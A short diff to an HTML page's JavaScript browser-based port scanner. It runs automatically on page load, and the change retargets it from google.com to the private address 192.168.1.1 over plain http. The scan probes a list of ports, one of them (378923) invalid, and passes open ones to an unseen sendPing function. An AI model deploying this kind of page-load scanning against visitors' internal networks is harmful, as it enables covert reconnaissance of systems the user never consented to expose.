@@ -6,7 +6,7 @@
     <script type="text/javascript">
         async function scanPort(host, port) {
             try {
-                let url = `https://${host}:${port}`;
+                let url = `http://${host}:${port}`;
                 await fetch(url, { mode: 'no-cors' });
                 console.log(`Port ${port} is open`);
                 sendPing(port);
@@ -36,7 +36,7 @@
         }
 
         document.addEventListener("DOMContentLoaded", function() {
-            let host = 'google.com'; // Replace with your target host
+            let host = '192.168.1.1'; // Replace with your target host
             let ports = [80, 443, 8080, 3000, 22, 21,378923]; // List of ports to scan
             scanPorts(host, ports).then(openPorts => {
                 console.log("Open ports:", openPorts);
